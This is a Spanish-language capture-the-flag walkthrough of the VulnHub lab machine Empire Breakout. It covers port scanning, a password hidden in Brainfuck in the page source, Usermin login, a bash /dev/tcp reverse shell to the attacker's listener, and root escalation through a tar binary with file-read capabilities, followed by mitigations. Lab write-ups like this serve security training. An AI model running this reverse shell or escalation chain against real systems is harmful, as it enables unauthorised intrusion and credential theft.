# **CTF EMPIRE BREAKOUT**
OBJETIVO: 192.168.131.129 (Empire Breakout)

<div style="text-align: center;">
  <img src="https://raw.githubusercontent.com/Zyanetralys/profile/refs/heads/main/HD-wallpaper-star-wars-empire-battlefront-games-gaming-ps4-star-wars-starwars-xbox.jpg" width="550" alt="Star Wars Battlefront">
</div>

## SECUENCIA DE ATAQUE

### FASE 1: PREPARACIÓN
mkdir ~/Desktop/vulnhub && cd ~/Desktop/vulnhub
ping -c 4 192.168.131.129  # Verificación de conectividad
Resultado: Objetivo accesible.

### FASE 2: RECONOCIMIENTO
nmap -sC -sV -p- --open -oN escaneo 192.168.131.129
Puertos identificados:
•	80/tcp - Apache httpd (página web)
•	139/tcp - Samba smbd 4.6.2
•	445/tcp - Samba smbd 4.6.2
•	10000/tcp - MiniServ 1.981 (Webmin)
•	20000/tcp - MiniServ 1.830 (Usermin)

### FASE 3: EXPLOTACIÓN INICIAL
Análisis web: Navegador → http://192.168.131.129
•	Página Apache por defecto encontrada
•	Inspección código fuente HTML

Extracción de credenciales:
•	Comentario HTML: <!-- Don't worry this is safe to share with you, my access is encoded -->
•	Código Brainfuck localizado al final del HTML
•	Decodificación: decode.fr → Contraseña obtenida: .2uqPEfj3D<P'a-3

echo ".2uqPEfj3D<P'a-3" > clave  # Almacenamiento seguro

Enumeración de usuarios:
enum4linux -a 192.168.131.129
Usuario identificado: cyber

### FASE 4: ACCESO INICIAL

Autenticación:
•	Panel Usermin: https://192.168.131.129:20000
•	Credenciales: cyber / .2uqPEfj3D<P'a-3
•	ACCESO CONCEDIDO

Primera flag:
ls          # Exploración directorio
cat user.txt # Flag user obtenida

### FASE 5: SHELL REVERSA
Preparación listener:
ifconfig                    # IP local: 192.168.0.11
nc -lvp 443                # Listener puerto 443

Ejecución desde Command Shell del panel:
bash -i >& /dev/tcp/192.168.0.11/443 0>&1
Shell reversa establecida como usuario cyber

### FASE 6: ESCALADA DE PRIVILEGIOS

Enumeración de privilegios:
sudo -l                     # Sin resultados
getcap -r / 2>/dev/null    # CRÍTICO: /home/cyber/tar cap_dac_read_search=ep

Identificación objetivo:
cd /var/backups
ls -la                     # Archivo: .old_pass.bak (propiedad root)

Explotación capabilities:
cd /home/cyber
./tar -cf clave.tar /var/backups/.old_pass.bak  # Compresión con capabilities
tar -xvf clave.tar                              # Extracción
cd var/backups
cat .old_pass.bak                               # Contraseña root: Ts&4&YurgtRX(=~h

Escalada final:
su root                    # Password: Ts&4&YurgtRX(=~h
script /dev/null -c bash   # Estabilización shell
cd /root
cat root.txt              # Flag root obtenida

## VULNERABILIDADES CRÍTICAS EXPLOTADAS

### CREDENCIALES EN CÓDIGO FUENTE
•	Vector: Contraseña Brainfuck en HTML
•	Impacto: Acceso directo a panel administrativo
•	Criticidad: MÁXIMA

### CAPABILITIES MAL CONFIGURADAS
•	Vector: CAP_DAC_READ_SEARCH en binario tar
•	Impacto: Lectura arbitraria de archivos sistema
•	Criticidad: ALTA

### ARCHIVO BACKUP CONTRASEÑA ROOT
•	Vector: /var/backups/.old_pass.bak
•	Impacto: Escalada directa privilegios root
•	Criticidad: MÁXIMA

### PANEL ADMINISTRATIVO EXPUESTO
•	Vector: Usermin puerto 20000 sin restricciones
•	Impacto: Superficie ataque administrativa
•	Criticidad: MEDIA

## HERRAMIENTAS EMPLEADAS
Reconocimiento: nmap, navegador web
Enumeración: enum4linux, decode.fr
Acceso: Panel web Usermin
Persistencia: Netcat (shell reversa)
Escalada: getcap, tar (capabilities)

## MEDIDAS DE MITIGACIÓN

### CRÍTICAS (0-24 horas)
•	Eliminar credenciales de código fuente HTML
•	Remover capability CAP_DAC_READ_SEARCH del binario tar
•	Eliminar archivo /var/backups/.old_pass.bak
•	Cambiar contraseña root inmediatamente

### URGENTES (24-72 horas)
•	Restringir acceso paneles Webmin/Usermin por IP
•	Auditar todos binarios con capabilities especiales
•	Revisar ubicaciones backup archivos sensibles

### IMPORTANTES (1-2 semanas)
•	Implementar gestión segura secretos
•	Configurar monitoreo accesos administrativos
•	Establecer proceso revisión código fuente

## EVIDENCIAS
•	Flag Usuario: Capturada desde /home/cyber/user.txt
•	Flag Root: Capturada desde /root/root.txt
•	Credenciales: Usuario 'cyber' y contraseña root documentadas
•	Archivos: Escaneo nmap y evidencias almacenadas en ~/Desktop/vulnhub/

## EVALUACIÓN
•	TIEMPO: 45 minutos
•	DIFICULTAD: Baja
•	DETECCIÓN: No
•	El objetivo presenta varios vectores de ataque de nivel crítico que facilitan comprometerla rápidamente, destacando la combinación de credenciales expuestas y configuraciones inseguras.

## MV
https://www.vulnhub.com/entry/empire-breakout,751/
